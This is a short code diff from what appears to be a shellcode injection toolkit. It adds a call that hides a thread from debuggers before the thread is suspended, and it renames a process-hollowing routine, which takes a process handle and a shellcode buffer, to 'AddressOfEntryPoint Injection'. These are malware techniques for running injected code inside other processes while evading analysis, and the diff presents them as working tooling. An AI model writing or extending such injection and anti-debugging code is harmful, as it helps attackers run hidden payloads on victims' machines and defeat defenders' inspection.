@@ -155,6 +155,8 @@ namespace execute {
 			}
 		}
 
+		malapi::HideFromDebugger(thread_handle);
+
 		if (!SuspendThreadC(thread_handle))
 		{
 			return LOG_ERROR("Failed to suspend thread. (Code: %08lX)", GetLastErrorC());
@@ -201,9 +203,9 @@ namespace execute {
 	}
 
 	//
-	// Process Hollowing
+	// AddressOfEntryPoint Injection
 	//
-	BOOL Hollowing(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
 	{
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
